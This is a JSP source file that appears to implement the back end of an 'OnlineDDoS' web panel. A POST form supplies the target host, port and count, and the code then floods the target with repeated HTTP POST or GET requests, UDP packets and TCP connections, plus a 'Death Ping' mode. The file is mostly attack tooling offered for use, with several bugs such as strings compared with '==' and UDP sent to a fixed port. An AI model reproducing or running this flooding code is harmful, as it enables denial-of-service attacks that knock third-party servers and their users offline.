<%@ page language="java" contentType="text/html; charset=utf-8"  import="java.io.*" %>
<%@ include file="tools.jsp" %>
<%@ page import="java.net.*" %>
<%@ page import="java.util.*" %>
<%
	if(request.getMethod()!="POST")
	{
		out.println("错误的访问方式！");
		return;
	}
	String Count = removeAllBlank(request.getParameter("count"));
	String IsDeath = removeAllBlank(request.getParameter("isDeath"));
	String ThreadCount = removeAllBlank(request.getParameter("threadcount"));
	String Paremeter = URLDecoder.decode(removeAllBlank(request.getParameter("paremeter")));
	String Target = removeAllBlank(request.getParameter("target"));
	String Port = removeAllBlank(request.getParameter("port"));
	String sign = removeAllBlank(request.getParameter("sign"));
	String mes = "";
	if(sign == "" || sign == null)
	{
		out.println("类型不能为空!");
		return;
	}
	if(Target == "" || Target == null)
	{
		out.println("目标不能为空!");
		return;
	}
	if((mes=CheckSafe(sign))!="True")
	{
		out.println(mes);
		return;
	}
	if((mes=CheckSafe(Target))!="True")
	{
		out.println(mes);
		return;
	}
	if(sign.equals("ping"))
	{
		if(IsDeath == "" || IsDeath == null)
		{
			if(Count == "" || Count == null)
			{
				out.println("缺少参数!");
				return;
			}
			int count = GetCount(Count);
			int result = 0;
			for(int i=0;i<count;i++)
			{
				result +=  ping(false);
			}
			out.println("Ping Success Count:"+result);
			return;
		}
		else
		{
			ping(true);
			out.println("Death Ping Success!");
			return;
		}
	}
	else if(sign.equals("post"))
	{
		if(Count == "" || Count == null)
		{
			out.println("缺少参数!");
			return;
		}
		if(Paremeter == "" || Paremeter == null)
		{
			out.println("缺少参数!");
			return;
		}
		int count = GetCount(Count);
		int result = 0;
		for(int i=0;i < count;i++)
		{
			result+=1;
			sendPost("http://"+Target+":"+Port+"/",Paremeter);
		}
		out.println("POST Success Count:"+result);
		return;
		
	}
	else if(sign.equals("get"))
	{
		if(Count == "" || Count == null)
		{
			out.println("缺少参数!");
			return;
		}
		if(Paremeter == "" || Paremeter == null)
		{
			out.println("缺少参数!");
			return;
		}
		int count = GetCount(Count);
		int result = 0;
		for(int i=0;i < count;i++)
		{
			result += 1;
			sendGet("http://"+Target+":"+Port+"/",Paremeter);
		}
		out.println("GET Success Count:"+result);
		return;
	}
	else if(sign.equals("udp"))
	{
		if(Count == "" || Count == null)
		{
			out.println("缺少参数!");
			return;
		}
		int result = 0;
		int count = GetCount(Count);
		for(int i=0;i < count;i++)
		{
			result++;
			result++;
			try
			{
				sendUDP(Target,GetCount(Port));
			}
			catch(IOException e)
			{
				out.println("UDP Target Server is Offline!");
				return;
			}
		}
		out.println("UDP Success Count:"+result);
		return;
	}
	else if(sign.equals("syn"))
	{
		if(Count == "" || Count == null)
		{
			out.println("缺少参数!");
			return;
		}
		int result = 0;
		int count = GetCount(Count);
		for(int i=0;i < count;i++)
		{
			result++;
			try
			{
				sendSYN(Target,GetCount(Port));
			}
			catch(IOException e)
			{
				out.println("SYN Target Server is Offline!");
				return;
			}
		}
		out.println("SYN Success Count:"+result);
		return;
	}
%>
<%!
   public int GetCount(String Count)
   {
	   try {
			int a = Integer.parseInt(Count);
			return a;
		} catch (NumberFormatException e) {
			e.printStackTrace();
			return -1;
		}
   }
   public int ping(Boolean isDeath)
   {
	   int result = 0;
	   Runtime  runtime  =  Runtime.getRuntime();
	   Process  process  =null;
	   String  line=null;
	   InputStream  is  =null;  
	   InputStreamReader  isr=null;
	   BufferedReader  br  =null;
	   String  ip="127.0.0.1";
		try  
	   {  
		   if(isDeath)
		   {
			   process  =runtime.exec("ping -t "+ip);
		   }
		   else
		   {
			   process  =runtime.exec("ping  "+ip);
		   }
		   is  =  process.getInputStream();
		   isr=new  InputStreamReader(is);
		   br  =new  BufferedReader(isr);
		   while(  (line  =  br.readLine())  !=  null  )
		   {
			   result++;
		   }
		   is.close();
		   isr.close();
		   br.close();
		   return result;
	   }
	   catch(IOException  e)
	   {
		   e.printStackTrace();
		   return 0;
	   }
   }
   public int sendPost(String url, String param) {
		PrintWriter out1 = null;
		BufferedReader in1 = null;
		String result = "";
		try {
			URLConnection conn = new URL(url).openConnection();
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			conn.setDoOutput(true);
			conn.setDoInput(true);
			out1 = new PrintWriter(conn.getOutputStream());
			out1.print(param);
			out1.flush();
			in1 = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line = null;
			while ((line = in1.readLine()) != null) {
				result += line;
			}
			out1.close();
			in1.close();
		} catch (Exception e) {
			e.printStackTrace();
			return 0;
		}
		return 1;
	}
	public int sendGet(String url, String param) {
		PrintWriter out1 = null;
		BufferedReader in1 = null;
		String urlp = url +"?"+param;
		String result = "";
		try {
			URLConnection conn = new URL(urlp).openConnection();
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			conn.setDoOutput(true);
			conn.setDoInput(true);
			out1 = new PrintWriter(conn.getOutputStream());
			out1.print(param);
			out1.flush();
			in1 = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line = null;
			while ((line = in1.readLine()) != null) {
				result += line;
			}
			out1.close();
			in1.close();
		} catch (Exception e) {
			e.printStackTrace();
			return 0;
		}
		return 1;
	}
	public void sendUDP(String IP,int Port) throws IOException
	{
		byte[] buf = new String("OnlineDDoS Test UDP").getBytes();
		DatagramPacket dp = new DatagramPacket(buf, buf.length, new InetSocketAddress(IP, 5678));
		DatagramSocket ds = new DatagramSocket(Port);
		ds.send(dp);
		ds.close();
	}
	public void sendSYN(String IP,int Port) throws UnknownHostException, IOException
	{
		String ip=IP;
		int port=Port;
		Socket sck=new Socket(ip,port);
		String content="OnlineDDoS Test TCP";
		byte[] bstream=content.getBytes("GBK");
		OutputStream os=sck.getOutputStream();
		os.write(bstream);
		sck.close();
	}
%>